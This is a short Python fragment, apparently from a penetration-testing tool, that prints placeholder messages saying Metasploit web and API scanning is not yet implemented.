    print('Resource scripts created. This is a placeholder for the MSF Web & API scanning functionality.')
    print('In a real implementation, this would run Metasploit modules against web applications and APIs.')
    print()
